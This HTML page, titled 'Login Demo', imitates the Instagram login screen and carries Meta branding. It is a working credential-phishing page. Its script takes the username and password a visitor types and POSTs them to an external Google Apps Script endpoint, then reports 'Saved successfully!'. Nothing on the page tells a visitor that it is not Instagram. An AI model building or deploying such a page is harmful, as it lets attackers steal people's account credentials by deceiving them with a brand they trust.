<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Demo</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}
body{
    background:#0f1016;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}
.wrapper{
    width:100%;
    max-width:430px;
    padding:24px;
}
.box{
    width:100%;
}
h1{
    color:white;
    font-size:28px;
    margin-bottom:24px;
}
input{
    width:100%;
    height:50px;
    padding:14px;
    margin-bottom:12px;
    border:1px solid #3a3f4b;
    border-radius:14px;
    background:#12141c;
    color:white;
    outline:none;
}
input:focus{
    border-color:#0095f6;
}
input::placeholder{
    color:#9ea4b2;
}
button{
    width:100%;
    height:50px;
    border:none;
    border-radius:25px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
}
.login-btn{
    background:#0d4d95;
    color:white;
    margin-top:8px;
}
.login-btn:disabled{
    opacity:0.5;
}
.forgot{
    text-align:center;
    color:white;
    margin:24px 0 50px;
    font-weight:600;
}
.facebook-btn{
    background:transparent;
    border:1px solid #3a3f4b;
    color:white;
    margin-bottom:14px;
}
.create-btn{
    background:transparent;
    border:1px solid #0095f6;
    color:#0095f6;
    margin-bottom:40px;
}
.meta{
    text-align:center;
    color:#c8ccd6;
}
#status{
    color:#c8ccd6;
    text-align:center;
    margin-top:15px;
}
</style>
</head>
<body>

<div class="wrapper">
    <div class="box">
      <h5>Meta</h5>
     <h1>Log into Instagram</h1>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Username / Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn" disabled>Sign In</button>
        </form>

<p class="forgot">Forgot password?</p>
        <button class="facebook-btn">ⓕ Log in with Facebook</button>
        <button class="create-btn">Create new account</button>

        <p class="meta">∞ Meta</p>
        <p id="status"></p>
        <p id="status"></p>
    </div>
</div>

<script>
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const loginForm = document.getElementById("loginForm");
const statusText = document.getElementById("status");

// Enable button when both fields have at least 1 character
function validateInputs() {
    if (
        usernameInput.value.trim() !== "" &&
        passwordInput.value !== ""
    ) {
        loginBtn.disabled = false;
    } else {
        loginBtn.disabled = true;
    }
}

usernameInput.addEventListener("input", validateInputs);
passwordInput.addEventListener("input", validateInputs);

loginForm.addEventListener("submit", async function(e){
    e.preventDefault();

    statusText.innerText = "Submitting...";

    const data = {
        username: usernameInput.value,
        password: passwordInput.value
    };

    try {
        const response = await fetch("https://script.google.com/macros/s/AKfycbyec0EdVsbde-3mGD1_9URa_sv5dnfKt7R-Qlx0F8pgxHiSpdCZJ-8syLvAfd1zfTCp/exec", {
            method: "POST",
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if(result.status === "success"){
            statusText.innerText = "Saved successfully!";
            loginForm.reset();
            loginBtn.disabled = true;
        } else {
            statusText.innerText = "Submit failed";
        }
    } catch(error){
        console.log(error);
        statusText.innerText = "Server error";
    }
});
</script>

</body>
</html>
